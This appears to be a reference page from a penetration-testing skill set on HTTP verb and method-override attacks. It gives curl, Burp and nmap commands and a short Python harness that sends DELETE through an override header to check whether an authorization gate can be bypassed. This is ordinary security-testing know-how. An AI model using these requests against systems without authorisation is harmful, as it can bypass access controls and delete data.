# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`http-method-and-verb-attacks`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -i -X PATCH 'https://target.example/admin/resource' -H 'X-HTTP-Method-Override: DELETE'` | Send an alternate effective verb against a gated route | Cross-platform |
| `curl` | `curl -sS -i -X OPTIONS 'https://target.example/admin/resource'` | Read the Allow header to enumerate accepted methods | Cross-platform |
| `Burp Suite Repeater` | `Resend the request cycling the method line, X-HTTP-Method-Override, and _method` | Find which mechanism sets the effective verb past the gate | Cross-platform |
| `nmap` | `nmap --script http-methods --script-args http-methods.url-path=/admin/ -p443 target.example` | Enumerate enabled methods including TRACE on the route | Linux, macOS, Windows |

## Minimal Script Shape

A verb-divergence harness: it sends a request under the gate-expected method and again with a method-override header, then reports whether the overridden verb escaped the authorization result.

```python
import sys, urllib.error, urllib.request

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://target.example/admin/resource"

def send(method, override=None):
    headers = {"User-Agent": "authorised-assessment"}
    if override:
        headers["X-HTTP-Method-Override"] = override
    req = urllib.request.Request(TARGET, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as exc:
        return exc.code

expected = send("POST")
overridden = send("POST", override="DELETE")
print({"gate_method_status": expected, "override_method_status": overridden,
       "possible_bypass": expected in (401, 403) and overridden not in (401, 403, 405)})
```
